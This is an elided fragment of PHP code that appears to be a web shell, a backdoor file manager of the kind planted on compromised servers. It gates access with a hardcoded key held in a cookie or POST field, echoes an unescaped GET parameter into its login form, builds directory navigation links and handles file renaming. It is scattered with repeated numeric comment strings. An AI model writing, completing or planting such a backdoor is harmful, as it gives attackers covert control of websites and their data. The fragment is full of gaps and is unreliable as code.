...
$auth_key = "8d873adde43682bdb407b938fa690eaa";
...
$pass = false;
if (isset($_COOKIE['pw_name_26689'])) {
    if(($_COOKIE['pw_name_26689']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_26689'])) {
        if(($_POST['pw_name_26689']) == $auth_key) {
            setcookie("pw_name_26689", $_POST['pw_name_26689']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_26689' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738802498302581 1738802498356304 1738802498421087 1738802498142884
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738802498302581 1738802498356304 1738802498421087 1738802498142884
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738802498302581 1738802498356304 1738802498421087 1738802498142884
            $name = PATH . "/" . $_GET['r'];
